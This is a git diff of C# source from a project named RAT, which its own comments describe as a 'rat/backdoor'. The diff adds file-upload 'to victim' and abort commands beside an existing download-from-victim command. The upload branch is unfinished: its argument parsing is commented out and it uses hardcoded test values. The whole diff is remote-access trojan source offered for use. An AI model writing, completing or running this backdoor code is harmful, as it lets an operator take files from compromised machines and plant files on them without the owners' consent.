@@ -1,4 +1,6 @@
 ﻿using RAT.src.Interfaces;
+using RAT.src.Models.Enums;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text.RegularExpressions;
@@ -13,22 +15,7 @@ namespace RAT.src.Logic.RatCommands
         private ISocketStateLogic _stateLogic;
         private IClientNotificationLogic _notificationLogic;
         private IFileDownloader _fileDownloader;
-
-        /// <summary>
-        /// Our rat/backdoor commands handling logic.
-        /// </summary>
-        /// <param name="stateLogic">Logic for our client state.</param>
-        /// <param name="notificationLogic">Logic client notification.</param>
-        /// <param name="fileDownloader">Logic for file download (to client).</param>
-        public RatCommandLogic(
-            ISocketStateLogic stateLogic,
-            IClientNotificationLogic notificationLogic,
-            IFileDownloader fileDownloader)
-        {
-            _stateLogic = stateLogic;
-            _fileDownloader = fileDownloader;
-            _notificationLogic = notificationLogic;
-        }
+        private IFileUploader _fileUploader;
 
         /// <summary>
         /// Currently available commands for our rat/backdoor.
@@ -41,6 +28,25 @@ namespace RAT.src.Logic.RatCommands
         /// to execute rat command, not shell command.
         /// </summary>
         private const string _ratCommandIdentifier = "RAT";
+
+        /// <summary>
+        /// Our rat/backdoor commands handling logic.
+        /// </summary>
+        /// <param name="stateLogic">Logic for our client state.</param>
+        /// <param name="notificationLogic">Logic client notification.</param>
+        /// <param name="fileDownloader">Logic for file download (to client).</param>
+        /// <param name="fileUploader">Logic for file upload (to victim).</param>
+        public RatCommandLogic(
+            ISocketStateLogic stateLogic,
+            IClientNotificationLogic notificationLogic,
+            IFileDownloader fileDownloader,
+            IFileUploader fileUploader)
+        {
+            _stateLogic = stateLogic;
+            _fileDownloader = fileDownloader;
+            _notificationLogic = notificationLogic;
+            _fileUploader = fileUploader;
+        }
 
         /// <summary>
         /// Determines if first word of string is command for rat.
@@ -69,9 +75,10 @@ namespace RAT.src.Logic.RatCommands
                 return;
             }
 
+            /////// -------- CAN BE REFACTORED LIKE COMMAND/QUERY WITH "ABORT" FUNCTIONALITY
             var words = formattedCommand.Split();
             string cleanCommand = words[1] + ' ' + words[2];
-            if (cleanCommand == "download file")
+            if (cleanCommand == "download file") // CAN BE MOVED TO ENUM
             {
                 int indexOfPath = formattedCommand.IndexOf(" -p ");
                 if (indexOfPath == -1)
@@ -81,6 +88,46 @@ namespace RAT.src.Logic.RatCommands
                 }
 
                 _fileDownloader.DownloadFile(formattedCommand.Substring(indexOfPath + " -p ".Length).Trim());
+            }
+            else if (cleanCommand == "upload file") // CAN BE MOVED TO ENUM
+            {
+                //int indexOfPath = formattedCommand.IndexOf(" -p ");
+                //if (indexOfPath == -1)
+                //{
+                //    _notificationLogic.NotifyClient($"\n\"-p\" (path) argument not found for RAT\n");
+                //    return;
+                //}
+
+                //int indexOfFileSize = formattedCommand.IndexOf(" -s ");
+                //if (indexOfFileSize == -1)
+                //{
+                //    _notificationLogic.NotifyClient($"\n\"-s\" (file size) argument not found for RAT\n");
+                //    return;
+                //}
+
+                //string filePath = formattedCommand.Substring(indexOfPath + " -p ".Length).Trim();
+                //string fileSizeInStringFormat = formattedCommand.Substring(indexOfPath + " -s ".Length).Trim();
+
+                //int fileSize = 0;
+                //try
+                //{
+                //    fileSize = Convert.ToInt32(fileSizeInStringFormat);
+                //}
+                //catch (Exception exception)
+                //{
+                //    _notificationLogic.NotifyClient($"\nError: {exception.Message}\n{fileSizeInStringFormat} is bad number\n");
+                //    return;
+                //}
+
+                string filePath = "somepath"; // TEST, REMOVE
+                int fileSize = 4096; // TEST, REMOVE
+                _fileUploader.PrepareForFileUpload(filePath, fileSize);
+            }
+            /////// -------- CAN BE REFACTORED LIKE COMMAND/QUERY WITH "ABORT" FUNCTIONALITY
+            else if (cleanCommand == "abort operation") // CAN BE MOVED TO ENUM
+            {
+                _stateLogic.State.CurrentOperation = CurrentOperation.None;
+                _notificationLogic.NotifyClient($"\nFile upload aborted\n");
             }
         }
 
